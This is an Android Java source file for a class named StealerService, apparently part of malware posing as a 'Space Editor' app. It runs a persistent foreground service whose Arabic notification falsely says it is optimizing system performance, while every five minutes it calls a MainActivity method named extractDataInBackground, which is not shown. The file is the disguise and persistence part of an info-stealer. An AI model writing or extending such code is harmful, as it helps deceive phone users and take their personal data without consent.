package com.example.spaceeditor;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

public class StealerService extends Service {
    private Thread workerThread;
    private boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        isRunning = true;
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Notification notification = new Notification.Builder(this, "stealer_channel")
                .setContentTitle("محرر المساحة")
                .setContentText("جاري تحسين أداء النظام...")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .build();
        startForeground(1, notification);

        if (workerThread == null || !workerThread.isAlive()) {
            workerThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    while (isRunning) {
                        try {
                            MainActivity.extractDataInBackground(StealerService.this);
                            Thread.sleep(300000);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
            });
            workerThread.start();
        }
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "stealer_channel",
                    "System Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
